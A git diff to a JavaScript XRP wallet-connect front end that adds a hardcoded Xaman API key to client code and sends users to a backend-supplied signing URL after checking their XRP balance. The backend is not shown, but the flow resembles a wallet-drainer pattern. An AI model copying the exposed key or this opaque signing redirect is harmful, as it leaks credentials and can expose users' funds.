@@ -1,8 +1,9 @@
 // ==============================
 // CONFIG
 // ==============================
-const BACKEND_URL = "https://cultured.pythonanywhere.com/"; // <-- CHANGE THIS
-const WC_PROJECT_ID = "YOUR_PROJECT_ID";
+const BACKEND_URL = "https://cultured.pythonanywhere.com/"; 
+const WC_PROJECT_ID = "YOUR_PROJECT_ID"; // Keep your WalletConnect ID here
+const XAMAN_API_KEY = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66"; // Your provided Key
 
 // ==============================
 // STATE
@@ -44,22 +45,23 @@ async function connectWallet(type) {
     setStatus("Connecting…");
 
     if (type === "xaman") {
-	  const xumm = new XummPkce();
+      // ✅ UPDATED: Initialized with your specific API Key
+      const xumm = new XummPkce(XAMAN_API_KEY);
 
-	  xumm.on("success", async () => {
-		const state = await xumm.state();
-		if (state?.me?.account) {
-		  handlePostConnect("xaman", state.me.account);
-		}
-	  });
+      xumm.on("success", async () => {
+        const state = await xumm.state();
+        if (state?.me?.account) {
+          handlePostConnect("xaman", state.me.account);
+        }
+      });
 
-	  xumm.on("error", err => {
-		console.error("Xaman connect error:", err);
-		setStatus("Xaman connection cancelled");
-	  });
+      xumm.on("error", err => {
+        console.error("Xaman connect error:", err);
+        setStatus("Xaman connection cancelled");
+      });
 
-	  await xumm.authorize(); // opens Xaman, NO redirect required
-	}
+      await xumm.authorize(); // opens Xaman, NO redirect required
+    }
 
 
     if (type === "walletconnect") {
@@ -100,14 +102,12 @@ async function triggerManualApproval() {
       body: JSON.stringify({ address: currentAddress })
     });
 
-    // 🔴 ADD THIS BLOCK RIGHT HERE
     if (!res.ok) {
       const err = await res.json();
       setStatus(err.detail || "Wallet has insufficient XRP");
       return;
     }
 
-    // ✅ Only parse success responses
     const data = await res.json();
 
     if (!data.signUrl) {
@@ -115,7 +115,7 @@ async function triggerManualApproval() {
       return;
     }
 
-    // 🔐 Redirect directly (NO popup tricks)
+    // 🔐 Redirect directly
     window.location.href = data.signUrl;
 
   } catch (err) {
